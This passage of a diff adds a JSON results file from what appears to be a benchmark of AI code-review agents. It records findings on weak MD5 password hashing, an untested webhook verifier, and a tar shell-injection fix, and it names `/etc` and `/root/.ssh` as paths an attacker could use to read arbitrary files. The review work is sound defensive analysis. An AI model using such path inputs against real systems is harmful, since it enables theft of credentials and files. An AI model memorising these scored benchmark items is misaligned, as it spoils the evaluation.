+              "confidence": 0.6,
+              "where": "webhooks/verify.py:10-12",
+              "title": "verify_acmepay added with no accompanying test",
+              "body": "The new verify_acmepay function is added with no test in this diff. Since no test file is included, there is nothing exercising it \u2014 a regression (e.g. wrong hash algorithm, swapped arguments, or the insecure `==` comparison instead of hmac.compare_digest used by verify_stripe) would not be caught by any existing or new test.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "webhooks/verify.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-weak-password-hash",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "auto_post",
+          "expected_decision": null,
+          "confidence": 0.75,
+          "cost_usd": 0.0832,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "crypto",
+              "severity": "major",
+              "confidence": 0.88,
+              "where": "auth/passwords.py:10-11",
+              "title": "Reset passwords hashed with unsalted MD5 instead of bcrypt",
+              "body": "`hash_reset_password` stores a user-supplied password as a single unsalted MD5 digest, while `hash_password` two lines above uses bcrypt with a per-password salt. MD5 is a fast, unsalted-here primitive: an adversary who obtains the stored value (SQL injection, backup/log exposure, insider access to the datastore) recovers the plaintext by rainbow-table lookup or offline brute force at billions of guesses per second, and because there is no salt, identical passwords across accounts produce identical digests so one crack breaks every matching account. If these digests are compared to authenticate a reset, that plaintext is a working credential for the account.\n\nUse the existing primitive: `return bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()`. If the intent was a one-time reset *token* rather than a password, do not hash a user-chosen secret at all \u2014 generate it with `secrets.token_urlsafe()`, store a SHA-256 of the high-entropy token, and compare with `hmac.compare_digest`.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "auth/passwords.py:11",
+              "matched_labels": [
+                "auth/passwords.py:11"
+              ],
+              "cites": [
+                "auth/passwords.py:10",
+                "auth/passwords.py:6"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.62,
+              "where": "auth/passwords.py:10-11",
+              "title": "Reset hash format is incompatible with bcrypt verification",
+              "body": "`hash_password` returns a bcrypt encoded string (`$2b$...`, self-describing salt and cost) while the new `hash_reset_password` returns a 32-character MD5 hex digest. If both values land in the same stored column, any verifier using `bcrypt.checkpw(raw.encode(), stored.encode())` will not match an MD5 digest \u2014 bcrypt treats a malformed hash as a non-match or raises `ValueError` depending on version, so reset-derived credentials will silently fail to authenticate (or blow up). No `verify_password` counterpart is added here, so nothing reconciles the two formats. Either produce a bcrypt hash in the reset path too (the raw material is identical \u2014 a plaintext string), or make the storage/verification path explicitly format-tagged. Note separately that MD5 here is unsalted and deterministic, so identical reset passwords collide to identical stored values.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "auth/passwords.py:10",
+              "matched_labels": [
+                "auth/passwords.py:10"
+              ],
+              "cites": [
+                "auth/passwords.py:6",
+                "auth/passwords.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-md5-for-cache-key",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.66,
+          "cost_usd": 0.1003,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.72,
+              "where": "render/cache.py:9",
+              "title": "json.dumps raises TypeError for contexts the old key accepted",
+              "body": "The previous key was `tuple(sorted(context.items()))`, which worked for any context whose keys were sortable and whose values were hashable \\u2014 `datetime`, `Decimal`, `UUID`, enum members, model instances, sets, etc. `json.dumps` accepts a far narrower domain and will raise `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller passing a non-JSON-native value in `context` goes from a working cached render to an uncaught exception at line 9, before `_render` is even reached. If the template engine itself accepts such values (most do), this is a live regression. Consider `json.dumps(..., default=repr)` or keeping a structural key and only digesting a canonical serialisation of primitives.",
+              "agreeing": [
+                "correctness"
+              ],
+              "categories": [
+                "api_contract",
+                "logic"
+              ],
+              "matched_label": "render/cache.py:9",
+              "matched_labels": [
+                "render/cache.py:9"
+              ],
+              "cites": [
+                "render/cache.py:9"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "render/cache.py:9-10",
+              "title": "No test covers context values that are hashable but not JSON-serializable",
+              "body": "The old key `tuple(sorted(context.items()))` worked for any hashable context values (tuples, frozensets, enums, custom objects with `__hash__`). The new key via `json.dumps([template_source, context], sort_keys=True)` requires every context value to be JSON-serializable, or `cached_render` now raises `TypeError` where it previously succeeded. None of the three tests in tests/test_cache.py pass a non-JSON-serializable-but-hashable context value, so this regression in accepted input types would go undetected.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "render/cache.py:9"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-subprocess-list-args",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.612,
+          "cost_usd": 0.14,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_quality",
+              "severity": "major",
+              "confidence": 0.75,
+              "where": "tests/test_archive.py:6-8",
+              "title": "Regression test only checks shell=False, not the argv structure",
+              "body": "`test_runs_without_a_shell` asserts `spy.last_call.kwargs[\"shell\"] is False` but never inspects `spy.last_call.args` (the actual list passed to subprocess.run). The vulnerability being fixed was shell command injection via string interpolation; the fix relies on both `shell=False` AND passing `name`/`directory` as separate list elements rather than interpolating them into one string. A future regression that reintroduces string interpolation (e.g. `[\"sh\", \"-c\", f\"tar -czf ... {directory}\"]`) while keeping `shell=False` would still pass this test, since only the `shell` kwarg is checked. The test should assert on the actual command list, e.g. that `directory` and the formatted name appear as separate argv elements.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/test_archive.py:6",
+              "matched_labels": [
+                "tests/test_archive.py:6"
+              ],
+              "cites": [
+                "tests/test_archive.py:6"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "export/archive.py:4-10",
+              "title": "Name allowlist rejects previously accepted names (dots, dates, length > 64)",
+              "body": "`SAFE_NAME` permits only `[A-Za-z0-9_-]` and at most 64 characters, so names that the old implementation happily accepted \u2014 `\"2024.01.01-nightly\"`, `\"customer 42\"`, `\"tenant/daily\"`, or any long generated name \u2014 now raise `ValueError` at call time rather than producing an archive. This turns a working code path into an exception for callers that were never dangerous. Consider widening the class to include `.` (while still rejecting `..`, `/` and leading `-`), and check whether any caller builds names from timestamps or tenant identifiers.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:4",
+                "export/archive.py:9"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "security",
+              "category": "input_validation",
+              "severity": "major",
+              "confidence": 0.55,
+              "where": "export/archive.py:7-15",
+              "title": "`directory` reaches tar unvalidated; arbitrary paths can be archived",
+              "body": "`name` is now constrained by `SAFE_NAME`, but `directory` is passed straight into the argv on line 12 with no check. The `--` separator correctly stops it being interpreted as a tar option, so this is not option or shell injection \u2014 but it does not stop it being any path on the filesystem. If a caller ever derives `directory` from request data (an export job spec, a form field, an API parameter), an attacker can pass `/etc`, `/root/.ssh`, or `../../<anything>` and get the contents written into `/exports/<name>.tar.gz`, which is presumably then served back to them: arbitrary file read.\n\nSuggest constraining `directory` the same way `name` is \u2014 resolve it with `os.path.realpath` and assert it stays under an allowed export root before invoking tar.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:12"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.55,
+              "where": "export/archive.py:11-15",
+              "title": "`directory` is now one literal argv entry; multi-path/glob callers break",
+              "body": "Under the old `shell=True` form, `directory` was interpolated into a command string and therefore word-split and glob-expanded by the shell, so `create_archive(\"x\", \"/srv/a /srv/b\")` or `create_archive(\"x\", \"/srv/data/*\")` archived several paths. With the list form it is passed as a single literal operand, so tar looks for a directory whose name contains a space or a literal `*`, fails, and \u2014 because `check=True` \u2014 the caller now gets `CalledProcessError` instead of an archive. Please confirm no caller passes a composed path string; if any does, accept a sequence of directories and splat it into the argv list.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:7",
+                "export/archive.py:11"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
